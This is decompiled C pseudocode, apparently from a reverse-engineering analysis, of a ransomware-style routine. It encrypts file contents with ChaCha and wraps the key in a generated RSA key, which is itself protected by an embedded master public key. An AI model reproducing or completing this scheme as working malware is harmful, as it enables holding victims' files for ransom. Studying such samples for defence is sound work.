int __fastcall encrypt_file_content_and_save_keys(FILE* out_file, FILE* in_file)
{
    __int64 v4; // rcx
    _DWORD* v5; // rdi
    __int128* _key; // rdi
    __int64 i; // rcx
    _QWORD key_out_buf[17]; // [rsp+20h] [rbp+0h] BYREF
    __int128 key[2]; // [rsp+A8h] [rbp+88h] BYREF
    __int128 nonce[9]; // [rsp+C8h] [rbp+A8h] BYREF

    v4 = 34i64;
    v5 = key_out_buf;
    while (v4)
    {
        *v5++ = 0;
        --v4;
    }
    _key = key;
    for (i = 34i64; i; --i)
    {
        *(_DWORD*)_key = 0;
        _key = (__int128*)((char*)_key + 4);
    }
    SystemFunction036(key, 32u);
    SystemFunction036((char*)nonce + 4, 12u);
    chacha_encrypt(out_file, in_file, key, nonce);
    protect_by_assymetric_crypt(key_out_buf, key, RSA_d, RSA_n);
    print_in_hex_to_file(out_file, RSA_master_public_key);
    putc(10, out_file);
    print_in_hex_to_file(out_file, RSA_n);
    putc(10, out_file);
    print_in_hex_to_file(out_file, RSA_protected_gen_priv_key);
    putc(10, out_file);
    print_in_hex_to_file(out_file, key_out_buf);  // protected ChaCha key
    return putc(10, out_file);
}

__int64 init_stuff()
{
    __int64 rsa_p[17]; // [rsp+30h] [rbp-348h] BYREF
    __int64 rsa_q[17]; // [rsp+B8h] [rbp-2C0h] BYREF
    __int64 buf1_sub1[17]; // [rsp+140h] [rbp-238h] BYREF
    __int64 buf2_sub1[17]; // [rsp+1C8h] [rbp-1B0h] BYREF
    __int64 rsa_euler[17]; // [rsp+250h] [rbp-128h] BYREF
    char RSA_generated_private[160]; // [rsp+2D8h] [rbp-A0h] BYREF

    do
        generate_random_buf(rsa_p);
    while (!(unsigned int)is_prime((unsigned __int64*)rsa_p));

    do
        generate_random_buf(rsa_q);
    while (!(unsigned int)is_prime((unsigned __int64*)rsa_q));

    bignum_mul(RSA_n, (unsigned __int64*)rsa_p, (unsigned __int64*)rsa_q);
    calc_sub1((unsigned __int64*)buf1_sub1, (unsigned __int64*)rsa_p);
    calc_sub1((unsigned __int64*)buf2_sub1, (unsigned __int64*)rsa_q);
    bignum_mul(rsa_euler, (unsigned __int64*)buf1_sub1, (unsigned __int64*)buf2_sub1);

    calculate_d(RSA_d, RSA_d, rsa_euler);
    return protect_by_assymetric_crypt(
        RSA_protected_gen_priv_key,
        RSA_generated_private,
        &g_SomeConts,
        RSA_master_public_key);
}
